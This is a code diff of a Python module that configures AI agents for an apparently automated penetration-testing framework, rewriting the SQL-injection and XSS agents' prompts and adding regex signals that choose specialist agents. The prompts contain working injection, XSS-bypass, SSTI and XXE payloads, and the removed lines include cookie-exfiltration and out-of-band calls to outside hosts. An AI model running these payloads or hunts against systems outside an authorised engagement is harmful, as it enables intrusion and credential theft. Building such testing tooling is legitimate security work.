@@ -15,9 +15,18 @@ Hunters:
   injection, xss, auth, authz, ssrf, csrf, cors, file_upload, open_redirect,
   race_condition, business_logic, oauth, llm_ai,
   http_smuggling, cache_poison, saml_sso, host_header
+
+Surface-selected add-ons (see create_hunters_for_engagement):
+  API/framework — graphql, grpc, websocket, nextjs, spring, laravel, aspnet,
+                  nodejs, deserialization
+  Enterprise — m365_entra, okta, sharepoint, enterprise_vpn, vcenter,
+               cloud_iam, supply_chain
 """
 
-from typing import List
+from __future__ import annotations
+
+import re
+from typing import List, Optional, Sequence
 
 from agent.core import Agent
 from agent.agents import HUNTER_CORE_TOOLS
@@ -32,9 +41,11 @@ from agent.hunt_patterns import (
     NEVER_SUBMIT_AND_CHAINS,
     OAUTH_PATTERNS,
     SAML_PATTERNS,
+    SQLI_PATTERNS,
     SSRF_PATTERNS,
     STACK_CONDITIONAL,
     SURFACE_RANK_PROTOCOL,
+    XSS_PATTERNS,
     pack,
 )
 
@@ -82,10 +93,10 @@ A single blocked attempt is not evidence of no vulnerability.
 
 INJECTION_TOOLS = [
     "discover_api_surface",
-    "scan_nuclei",
-    "sql_injection_test",
     "discover_parameters",
-    "scan_js_urls_for_secrets",
+    "probe_sqli_params",
+    "sql_injection_test",
+    "scan_nuclei",
     "fuzz_directories",
     "send_http_request",
     "confirm_vulnerability_poc",
@@ -94,11 +105,12 @@ INJECTION_TOOLS = [
 
 XSS_TOOLS = [
     "discover_api_surface",
-    "scan_nuclei",
+    "discover_parameters",
+    "crawl_urls",
+    "probe_xss_reflection",
     "xss_test",
     "test_dom_xss",
-    "crawl_urls",
-    "discover_parameters",
+    "scan_nuclei",
     "send_http_request",
     "confirm_vulnerability_poc",
     *HUNTER_CORE_TOOLS,
@@ -266,54 +278,53 @@ def create_injection_hunter(max_turns: int = 50) -> Agent:
     return Agent(
         name="injection_hunter",
         instructions="""You are the **Injection specialist** in the Aegis Vanguard fireteam.
-Hunt: SQL injection (all types), NoSQL injection, OS command injection, LDAP injection,
-server-side template injection (SSTI), and XXE.
+Hunt: SQL injection (error / boolean / time / UNION), NoSQL operator injection, SSTI, XXE, cmdi.
 
-## Methodology
+## Mandatory workflow (do NOT start with nuclei-only spray)
 
-### Phase 1 — Surface mapping
-1. Read the recon brief for parameterized URLs (?key=val), API endpoints, and form routes.
-2. If API inventory is thin, call discover_api_surface to find REST/GraphQL/WebSocket endpoints.
-3. Run nuclei with injection tags:
-   scan_nuclei(templates="tags=sqli,injection,cmdi,ldap,xxe,ssti,nosql")
-4. Use discover_parameters on each interesting endpoint — hidden params are common injection sinks.
-5. Fuzz /api, /v1, /v2 base paths with fuzz_directories.
+### Phase 1 — Rank injectable surfaces (2–4 turns)
+1. Read recon/app profile for parameterized URLs and forms.
+2. Priority targets (test these FIRST):
+   /search?q=  /filter=  /sort=  /report?  /api/*?id=  ?page=&limit=  login JSON bodies
+3. discover_parameters on top 3–5 endpoints if param list is thin.
+4. Optional: scan_nuclei(templates="tags=sqli,ssti,xxe,nosql") — secondary, not primary.
 
-### Phase 2 — SQLi testing
-Test all 6 types:
-- **Error-based**: `'`, `"`, `)`, `-- -`, `/**/` — look for DB error strings in response
-- **UNION-based**: `' UNION SELECT 1,2,@@version-- -` (MySQL), `' UNION SELECT 1,version()-- -` (PG)
-- **Blind boolean**: `' AND 1=1-- -` vs `' AND 1=2-- -` — compare response lengths/content
-- **Blind time**: `'; SLEEP(5)-- -` (MySQL), `'; SELECT pg_sleep(5)-- -` (PG), `'; WAITFOR DELAY '0:0:5'-- -` (MSSQL)
-- **Out-of-band**: `'; EXEC xp_dirtree('//attacker.burpcollaborator.net/a')-- -`
-- **Second-order**: probe fields that get stored and reused in a later query (usernames, profile fields, filenames)
+### Phase 2 — Differential probe (REQUIRED before sqlmap)
+For each ranked URL call:
+  probe_sqli_params(target_url=..., method=..., body=..., params="id,q,...")
+This runs quote / boolean / short time checks and returns candidates[].
 
-For confirmed candidate params: sql_injection_test(target_url=...) — sqlmap --batch
+Interpretation:
+- signals include sql_error or time_delay → HIGH confidence → escalate to sqlmap
+- boolean_diff only → still escalate with -p that param
+- no candidates → try next endpoint / POST JSON / header sinks — do not declare clean after one URL
 
-### Phase 3 — SSTI detection
-Test template syntax in all string inputs:
-- `{{7*7}}` → 49 (Jinja2/Twig)
-- `${7*7}` → 49 (Freemarker/Mako)
-- `<%= 7*7 %>` → 49 (ERB/EJS)
-- `#{7*7}` → 49 (Ruby ERB)
-- `{{7*'7'}}` → 7777777 (Jinja2 vs Twig fingerprint)
+### Phase 3 — Confirm with sqlmap (targeted)
+For EACH candidate:
+  sql_injection_test(target_url=..., param="<name>", data="<post body if any>", level=3, risk=2)
+Never run sqlmap on the bare homepage with no params.
 
-### Phase 4 — XXE
-Test any XML-consuming endpoint or file upload accepting XML/SVG/DOCX:
-```xml
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-```
-SVG uploads: `<svg xmlns="http://www.w3.org/2000/svg"><image href="file:///etc/passwd"/></svg>`
+### Phase 4 — Technique choice (manual follow-up via send_http_request)
+If probe finds reflection of query results (search/list pages) → prefer UNION:
+  1. Confirm with '
+  2. ORDER BY / UNION SELECT NULL,NULL,... until column count known (don't guess)
+  3. Place markers in reflected columns — proof = data in response
+Reserve slow blind char extraction for non-reflecting endpoints only.
 
-### Confirmation
-For any confirmed finding, call confirm_vulnerability_poc with the exact endpoint,
-payload, and response snippet before completing your turn.
+NoSQL (JSON APIs): try {"username":{"$ne":""}} / param[$ne]=x on login/search.
+
+SSTI: {{7*7}} ${7*7} <%=7*7%> — confirm arithmetic in response.
+XXE: only on XML/SVG/DOCX consumers.
+
+### Phase 5 — Confirm or kill
+ALWAYS call confirm_vulnerability_poc for every confirmed SQLi/SSTI/XXE with:
+  vuln_type, endpoint, payload, response_snippet
+Do NOT exfiltrate PII — prove with non-sensitive fields (version(), database()).
 """ + _BRAIN_AND_PRIOR_ART_PROTOCOL + _WAF_BYPASS_PROTOCOL + _STACKED_ENCODING_MANDATE + pack(
-            SURFACE_RANK_PROTOCOL, STACK_CONDITIONAL
+            SQLI_PATTERNS, SURFACE_RANK_PROTOCOL, STACK_CONDITIONAL, NEVER_SUBMIT_AND_CHAINS
         ) + """
 ## Scope
-Hunt injection ONLY. Do not test XSS, auth, authz, or SSRF — other hunters cover those.
-Do NOT exfiltrate data even if injection confirmed. Prove existence, then stop.
+Injection ONLY. XSS → xss_hunter. SSRF → ssrf_hunter. No data dumps beyond proof.
 """,
         tool_names=INJECTION_TOOLS,
         max_turns=max_turns,
@@ -325,54 +336,52 @@ def create_xss_hunter(max_turns: int = 50) -> Agent:
     return Agent(
         name="xss_hunter",
         instructions="""You are the **XSS specialist** in the Aegis Vanguard fireteam.
-Hunt: Reflected XSS, Stored XSS, DOM-based XSS (all sub-types).
+Hunt: Reflected XSS, Stored XSS, DOM XSS.
 
-## Methodology
+## Mandatory workflow (do NOT start with XSStrike-only spray)
 
-### Phase 1 — Surface discovery
-1. Read the recon brief for URLs echoing user input, SPA routes, rich-text fields, file upload names.
-2. If SPA/API-heavy, call discover_api_surface for JSON routes, GraphQL, client-side routes.
-3. Run nuclei with XSS tags: scan_nuclei(templates="tags=xss,dom-xss,reflected-xss,stored-xss")
-4. Crawl with crawl_urls, then discover_parameters on reflection-prone endpoints.
+### Phase 1 — Find reflection surfaces (2–4 turns)
+1. From recon: query/echo params, search, error messages, profile fields, URL redirects.
+2. crawl_urls + discover_parameters on reflection-prone routes.
+3. Priority params: q, search, query, name, msg, error, callback, next, return, redirect, url
 
-### Phase 2 — Reflection testing
-For each URL with query params: xss_test(target_url=...) — XSStrike.
-For DOM-heavy SPAs, hash-based routing, or postMessage sinks: test_dom_xss(target_url=...).
+### Phase 2 — Canary reflection map (REQUIRED)
+For each candidate URL:
+  probe_xss_reflection(target_url=..., params="q,search,...")
+Read reflections[]:
+- contexts html_body / attr_* / script_block → craft context-correct payloads
+- encoded_only → try encoding bypasses before declaring clean
+- no reflections → try DOM path (Phase 4), not more alert(1) spam
 
-### Phase 3 — 7-Tier Detection Rotation (MANDATORY)
-A blocked `alert(1)` is NOT evidence of no XSS. Walk this ladder, ≥3 variants each tier:
+### Phase 3 — Context payloads + tool confirm
+1. Use probe findings' suggested payloads; then xss_test(target_url) on reflected URLs.
+2. A blocked alert(1) is NOT proof of no XSS. Rotate execution sinks:
+   Tier1 alert/prompt → Tier3 document.title → Tier4 window.__vanguard_xss=1
+   → event handlers <img onerror> <svg onload> → constructor chains
+3. WAF present → skip dialogs; use marker property / OOB style payloads.
 
-  Tier 1: alert(1) / alert`1`
-  Tier 2: prompt(1) / confirm(1) / print() / console.log('XSS')
-  Tier 3: document.title='XSS-PROBE'   ← survives all dialog overrides
-  Tier 4: window.xss_proof=Date.now()  ← global write, programmatic readback
-  Tier 5: fetch('https://oast.fun/?c='+btoa(document.cookie))  ← OOB + cookie capture
-  Tier 6: top[8680439..toString(30)](1)  ← obfuscated — bypasses keyword filters
-  Tier 7: new Function('ale'+'rt(1)')() / []['constructor']['constructor']('alert(1)')()
+### Phase 4 — DOM XSS (Playwright)
+When SPA / hash routing / heavy JS / postMessage:
+  test_dom_xss(target_url=..., params="q,search,redirect")
+This catches sinks XSStrike misses.
 
-Jump straight to Tier 5 (OOB) when the target has a heavy WAF — it bypasses all
-dialog overrides and captures real cookie evidence in one shot.
+### Phase 5 — Stored XSS
+Probe comment/profile/filename/label fields with unique canary, re-fetch page,
+confirm persistence + execution.
 
-### Phase 4 — Filter bypass decision tree
-Script tag blocked → use event handlers: <img onerror=...> <svg onload=...> <body onpageshow=...>
-`alert` string blocked → constructor chain: []['constructor']['constructor']('alert(1)')()
-Parentheses blocked → tagged template literals: alert`1` setTimeout`alert\x281\x29`
-Quotes blocked → String.fromCharCode(97,108,101,114,116) or /regex/.source
-Length-limited → <svg/onload=eval(name)> with payload in window.name
+### Kill signals
+- Self-XSS only (attacker pastes into own console) without delivery path
+- Reflection fully HTML-encoded with no bypass after stacked encoding attempts
+- CSP blocks ALL script with no gadget — note CSP, don't overclaim
 
-### Important sub-types
-- **Stored XSS**: comments, profile fields, filenames, webhooks, labels, descriptions
-- **DOM XSS**: hash (#), postMessage, document.write, innerHTML, eval, location sinks
-- **mXSS**: test in sanitizer contexts — <noscript><p title="</noscript><img onerror=...>
-- **OAuth returnTo**: ?returnTo=javascript:alert(1) or ?next=//evil.com
-
-### Confirmation
-For any XSS confirmed, call confirm_vulnerability_poc with vuln_type="xss" or "dom-xss",
-including the exact payload and execution proof (tier reached, any captured data).
-""" + _BRAIN_AND_PRIOR_ART_PROTOCOL + _WAF_BYPASS_PROTOCOL + """
+### Confirm
+ALWAYS confirm_vulnerability_poc(vuln_type="xss"|"dom-xss", payload=..., response_snippet=...)
+Execution proof required: dialog, window marker, or Playwright evidence — not reflection alone.
+""" + _BRAIN_AND_PRIOR_ART_PROTOCOL + _WAF_BYPASS_PROTOCOL + pack(
+            XSS_PATTERNS, SURFACE_RANK_PROTOCOL, NEVER_SUBMIT_AND_CHAINS
+        ) + """
 ## Scope
-Hunt XSS ONLY. Skip injection, auth, authz, SSRF — other hunters cover those.
-Kill: self-XSS without CSRF delivery path, dead reflections with full CSP blocking and no bypass.
+XSS ONLY. Injection → injection_hunter. Open redirect without script → open_redirect_hunter.
 """,
         tool_names=XSS_TOOLS,
         max_turns=max_turns,
@@ -1140,15 +1149,8 @@ Host-header impact only. Generic open redirects belong to open_redirect_hunter.
 # Convenience: build all hunters at once
 # =============================================================================
 
-def create_all_hunters(max_turns: int = 50) -> List[Agent]:
-    """Return the full OWASP fireteam (core + advanced hunters).
-
-    Args:
-        max_turns: per-hunter ReAct turn budget. 50 is a good default for
-            comprehensive coverage; use 25 for fast/cheap scans.
-    """
-    # Scale specialized hunters proportionally — they have narrower scope
-    # so they need fewer turns than the broad-spectrum hunters.
+def create_core_hunters(max_turns: int = 50) -> List[Agent]:
+    """Return the always-on OWASP fireteam (webapp bug classes)."""
     broad_turns = max_turns
     narrow_turns = max(15, max_turns // 2)
 
@@ -1173,6 +1175,204 @@ def create_all_hunters(max_turns: int = 50) -> List[Agent]:
     ]
 
 
+def create_all_hunters(max_turns: int = 50) -> List[Agent]:
+    """Return the core OWASP fireteam (backward-compatible alias).
+
+    Prefer create_hunters_for_engagement() so API/framework/enterprise
+    specialists activate only when surface signals are present.
+    """
+    return create_core_hunters(max_turns=max_turns)
+
+
+# ---------------------------------------------------------------------------
+# Surface-triggered specialist selection
+# ---------------------------------------------------------------------------
+
+# (hunter_factory_name, compiled signal patterns) — matched against recon+app text
+_API_FRAMEWORK_SIGNALS = {
+    "graphql": [
+        r"\bgraphql\b", r"/graphql", r"\bgraphiql\b", r"__schema", r"apollo",
+    ],
+    "grpc": [
+        r"\bgrpc\b", r"grpc-web", r"application/grpc", r"server.?reflection",
+        r"protobuf",
+    ],
+    "websocket": [
+        r"\bwebsocket\b", r"\bwss?://", r"socket\.io", r"SockJS", r"upgrade:\s*websocket",
+    ],
+    "nextjs": [
+        r"\bnext\.?js\b", r"/_next/", r"x-nextjs", r"__NEXT_DATA__", r"\brsc\b",
+    ],
+    "spring": [
+        r"\bspring\s*boot\b", r"/actuator", r"whitelabel", r"\bjolokia\b",
+        r"x-application-context",
+    ],
+    "laravel": [
+        r"\blaravel\b", r"laravel_session", r"\bignition\b", r"\btelescope\b",
+        r"xsrf-token",
+    ],
+    "aspnet": [
+        r"\basp\.?net\b", r"__VIEWSTATE", r"x-aspnet", r"\.aspx\b", r"\biis\b",
+        r"elmah\.axd",
+    ],
+    "nodejs": [
+        r"\bexpress\b", r"x-powered-by:\s*express", r"\bnode\.?js\b",
+        r"prototype.?pollution",
+    ],
+    "deserialization": [
+        r"\bdeserial", r"\bpickle\b", r"ObjectInputStream", r"ysoserial",
+        r"BinaryFormatter", r"java\.io\.Serializable", r"\bviewstate\b",
+        r"\blog4j\b", r"\bjndi\b",
+    ],
+}
+
+_ENTERPRISE_SIGNALS = {
+    "m365_entra": [
+        r"login\.microsoftonline\.com", r"\.onmicrosoft\.com", r"\bentra\b",
+        r"\bazure\s*ad\b", r"\boffice\s*365\b", r"\bm365\b", r"autodiscover",
+        r"GetCompanyInformation", r"sts\.windows\.net",
+    ],
+    "okta": [
+        r"\bokta\b", r"\.okta\.com", r"oktapreview", r"okta-organization",
+    ],
+    "sharepoint": [
+        r"\bsharepoint\b", r"/_layouts/", r"/_vti_bin/", r"Authentication\.asmx",
+        r"MicrosoftSharePoint", r"\btoolshell\b",
+    ],
+    "enterprise_vpn": [
+        r"\banyconnect\b", r"\bfortinet\b", r"\bfortigate\b", r"\bcitrix\b",
+        r"\bnetscaler\b", r"global-protect", r"\bpulse\b", r"\bivanti\b",
+        r"\bsonicwall\b", r"\bbig-?ip\b", r"/dana-na/", r"/remote/login",
+        r"\bcisco\s*asa\b", r"ssl\s*vpn",
+    ],
+    "vcenter": [
+        r"\bvcenter\b", r"\bvsphere\b", r"/vcsa", r"\bvmware\b",
+        r"workspace\s*one", r"\baria\b", r"\bvrealize\b",
+    ],
+    "cloud_iam": [
+        r"\bAKIA[0-9A-Z]{16}\b", r"\bASIA[0-9A-Z]{16}\b", r"aws_secret",
+        r"\.amazonaws\.com", r"s3[.-]amazonaws", r"storage\.googleapis",
+        r"firebaseio\.com", r"BEGIN PRIVATE KEY", r"client_secret",
+        r"azure.*blob", r"shared access signature", r"\bIMDS\b",
+        r"169\.254\.169\.254", r"sts\.amazonaws\.com", r"assume.?role",
+    ],
+    "supply_chain": [
+        r"package\.json", r"package-lock", r"requirements\.txt", r"go\.mod",
+        r"\.git/HEAD", r"github\.com/.*/\.github/workflows", r"dependency.?confusion",
+        r"Dockerfile", r"\.npmrc", r"private.?registry", r"source.?map",
+    ],
+}
+
+
+def _surface_matches(text: str, patterns: Sequence[str]) -> bool:
+    if not text:
+        return False
+    return any(re.search(p, text, re.I) for p in patterns)
+
+
+def detect_surface_signals(*texts: str) -> dict:
+    """Return which specialist packs should activate from recon/app text."""
+    blob = "\n".join(t for t in texts if t)
+    return {
+        "api_framework": {
+            name: _surface_matches(blob, pats)
+            for name, pats in _API_FRAMEWORK_SIGNALS.items()
+        },
+        "enterprise": {
+            name: _surface_matches(blob, pats)
+            for name, pats in _ENTERPRISE_SIGNALS.items()
+        },
+    }
+
+
+def create_hunters_for_engagement(
+    max_turns: int = 50,
+    recon_brief: str = "",
+    app_profile: str = "",
+    *,
+    include_api_framework: Optional[bool] = None,
+    include_enterprise: Optional[bool] = None,
+    force_all_specialists: bool = False,
+) -> List[Agent]:
+    """Build core hunters + surface-triggered API/framework/enterprise packs.
+
+    Args:
+        max_turns: per-hunter turn budget for core hunters.
+        recon_brief / app_profile: text used to detect specialist signals.
+        include_api_framework: True=all API/framework, False=none,
+            None=signal-selected (default).
+        include_enterprise: True=all enterprise, False=none,
+            None=signal-selected (default).
+        force_all_specialists: activate every specialist regardless of signals.
+    """
+    from agent.api_framework_hunters import (
+        create_aspnet_hunter,
+        create_deserialization_hunter,
+        create_graphql_hunter,
+        create_grpc_hunter,
+        create_laravel_hunter,
+        create_nextjs_hunter,
+        create_nodejs_hunter,
+        create_spring_hunter,
+        create_websocket_hunter,
+    )
+    from agent.enterprise_hunters import (
+        create_cloud_iam_hunter,
+        create_enterprise_vpn_hunter,
+        create_m365_entra_hunter,
+        create_okta_hunter,
+        create_sharepoint_hunter,
+        create_supply_chain_hunter,
+        create_vcenter_hunter,
+    )
+
+    hunters = create_core_hunters(max_turns=max_turns)
+    signals = detect_surface_signals(recon_brief, app_profile)
+    narrow = max(15, max_turns // 2)
+    mid = max(20, max_turns - 10)
+
+    api_factories = {
+        "graphql": lambda: create_graphql_hunter(mid),
+        "grpc": lambda: create_grpc_hunter(narrow),
+        "websocket": lambda: create_websocket_hunter(narrow),
+        "nextjs": lambda: create_nextjs_hunter(mid),
+        "spring": lambda: create_spring_hunter(mid),
+        "laravel": lambda: create_laravel_hunter(narrow),
+        "aspnet": lambda: create_aspnet_hunter(narrow),
+        "nodejs": lambda: create_nodejs_hunter(narrow),
+        "deserialization": lambda: create_deserialization_hunter(narrow),
+    }
+    ent_factories = {
+        "m365_entra": lambda: create_m365_entra_hunter(mid),
+        "okta": lambda: create_okta_hunter(mid),
+        "sharepoint": lambda: create_sharepoint_hunter(mid),
+        "enterprise_vpn": lambda: create_enterprise_vpn_hunter(mid),
+        "vcenter": lambda: create_vcenter_hunter(narrow),
+        "cloud_iam": lambda: create_cloud_iam_hunter(max(25, max_turns - 5)),
+        "supply_chain": lambda: create_supply_chain_hunter(narrow),
+    }
+
+    def _should_add(group: str, name: str, include_flag: Optional[bool]) -> bool:
+        if force_all_specialists or include_flag is True:
+            return True
+        if include_flag is False:
+            return False
+        return bool(signals[group].get(name))
+
+    for name, factory in api_factories.items():
+        if _should_add("api_framework", name, include_api_framework):
+            hunters.append(factory())
+
+    for name, factory in ent_factories.items():
+        if _should_add("enterprise", name, include_enterprise):
+            hunters.append(factory())
+
+    # Always consider cloud_iam lightly when any secrets/JS analysis ran —
+    # covered by signal patterns; if force enterprise, already included.
+
+    return hunters
+
+
 HUNTER_CATEGORIES = {
     "injection_hunter":      "injection",
     "xss_hunter":            "xss",
@@ -1191,4 +1391,22 @@ HUNTER_CATEGORIES = {
     "cache_poison_hunter":   "cache_poison",
     "saml_sso_hunter":       "saml_sso",
     "host_header_hunter":    "host_header",
+    # API / framework
+    "graphql_hunter":        "graphql",
+    "grpc_hunter":           "grpc",
+    "websocket_hunter":      "websocket",
+    "nextjs_hunter":         "nextjs",
+    "spring_hunter":         "spring",
+    "laravel_hunter":        "laravel",
+    "aspnet_hunter":         "aspnet",
+    "nodejs_hunter":         "nodejs",
+    "deserialization_hunter": "deserialization",
+    # Enterprise perimeter
+    "m365_entra_hunter":     "m365_entra",
+    "okta_hunter":           "okta",
+    "sharepoint_hunter":     "sharepoint",
+    "enterprise_vpn_hunter": "enterprise_vpn",
+    "vcenter_hunter":        "vcenter",
+    "cloud_iam_hunter":      "cloud_iam",
+    "supply_chain_hunter":   "supply_chain",
 }
